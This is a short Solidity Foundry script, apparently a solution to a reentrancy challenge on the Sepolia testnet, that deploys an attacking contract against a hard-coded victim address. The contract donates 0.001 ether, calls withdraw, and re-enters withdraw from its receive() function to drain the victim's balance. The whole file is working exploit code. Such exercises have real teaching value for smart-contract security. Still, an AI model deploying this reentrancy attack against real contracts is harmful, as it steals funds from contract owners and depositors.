//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import "forge-std/console.sol";

//address contract on sepolia:  0x467ABEcEBF3B2c0F0D3F0c6649F8AFb3714a9549
// balance of the contract is : 0.001 ether
contract stealFunds is Script {
    function run() public {
        vm.startBroadcast();
        hackReentrance hack = new hackReentrance{value: 0.001 ether}();
        console.log(address(hack).balance);
        hack.attack();
        console.log(address(hack).balance);
        vm.stopBroadcast();
    }
}

contract hackReentrance {
    address victimContract = 0x467ABEcEBF3B2c0F0D3F0c6649F8AFb3714a9549;

    constructor() payable {} // fund the contract with 0.001 eth

    function attack() public payable {
        bytes memory sig = abi.encodeWithSignature(
            "donate(address)",
            address(this)
        );
        (bool ok, ) = victimContract.call{value: 0.001 ether}(sig);
        require(ok, "tx failed");
        bytes memory sig2 = abi.encodeWithSignature(
            "withdraw(uint256)",
            0.001 ether
        );
        (bool okk, ) = victimContract.call(sig2);
        require(okk, "withdraw fail ");
    }

    receive() external payable {
        bytes memory sig2 = abi.encodeWithSignature(
            "withdraw(uint256)",
            0.001 ether
        );
        (bool tr, ) = victimContract.call(sig2);
        require(tr);
    }
}
